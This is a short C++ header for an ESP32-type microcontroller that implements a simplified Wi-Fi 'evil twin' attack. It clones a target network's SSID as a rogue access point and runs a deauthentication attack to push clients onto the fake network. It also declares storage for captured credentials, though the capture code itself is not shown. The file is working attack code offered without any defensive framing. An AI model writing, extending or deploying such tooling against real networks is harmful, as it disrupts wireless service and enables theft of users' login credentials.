// eviltwin.h - Simplified Evil Twin (AP Spoof + Deauth)
#ifndef EVILTWIN_H
#define EVILTWIN_H

#include <WiFi.h>
#include <vector>

bool evilTwinActive = false;
std::vector<String> capturedCreds;
String evilSSID;
String evilBSSID;

void startEvilTwin(int idx) {
  evilTwinActive = true;
  extern struct NetworkInfo networks[];
  evilSSID = networks[idx].ssid;
  evilBSSID = networks[idx].bssid;
  
  // Start AP with target SSID
  WiFi.mode(WIFI_AP);
  WiFi.softAP(evilSSID.c_str());
  
  // Start deauth attack to force clients to reconnect
  startDeauthAttack(idx);
  
  Serial.printf("Evil Twin started on %s (BSSID: %s)\n", 
    evilSSID.c_str(), evilBSSID.c_str());
  Serial.printf("AP IP: %s\n", WiFi.softAPIP().toString().c_str());
  Serial.println("Clients will see: " + evilSSID);
  Serial.println("(Deauth attack running to force reconnection)");
}

void stopEvilTwin() {
  evilTwinActive = false;
  WiFi.softAPdisconnect(true);
  stopDeauthAttack();
  Serial.println("Evil Twin stopped");
}

void runEvilTwin() {
  if (!evilTwinActive) return;
  runDeauth();  // Continue deauthing
  delay(10);
}

#endif
